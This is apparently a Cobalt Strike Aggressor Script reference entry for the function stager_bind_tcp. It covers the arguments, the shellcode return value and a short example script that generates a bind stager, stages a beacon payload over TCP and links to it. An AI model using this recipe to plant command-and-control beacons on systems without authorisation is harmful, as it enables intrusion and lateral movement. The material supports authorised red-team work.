stager_bind_tcp

Returns a bind_tcp stager for a specific Cobalt Strike listener. This stager is suitable for use in localhost-only actions that require a small stager. Stage with &beacon_stage_tcp.

#### Arguments

`$1` - the listener name

`$2` - x86|x64 - the architecture of the stager output.

`$3` - the port to bind to

#### Returns

A scalar containing bind_tcp shellcode

#### Example

```
# step 1. generate our stager
$stager = stager_bind_tcp("my-listener", "x86", 1234);

# step 2. do something to run our stager

# step 3. stage a payload via this stager
beacon_stage_tcp($bid, $target, 1234, "my-listener", "x86");

# step 4. assume control of the payload (if needed)
beacon_link($bid, $target, "my-listener");```

See also&artifact_general
